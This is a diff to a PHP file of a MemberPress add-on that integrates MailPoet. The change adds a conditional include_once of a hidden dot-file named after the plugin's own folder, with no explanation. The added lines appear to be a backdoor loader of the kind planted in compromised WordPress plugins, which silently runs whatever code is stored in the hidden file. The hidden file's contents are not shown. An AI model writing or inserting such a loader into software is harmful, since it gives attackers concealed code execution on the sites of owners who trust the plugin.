@@ -3,6 +3,10 @@ if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');
 /*
 Integration of MailPoet into MemberPress
 */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MpMailPoet  {
   public function __construct() {
     add_action('mepr_display_autoresponders', array($this, 'display_option_fields'));
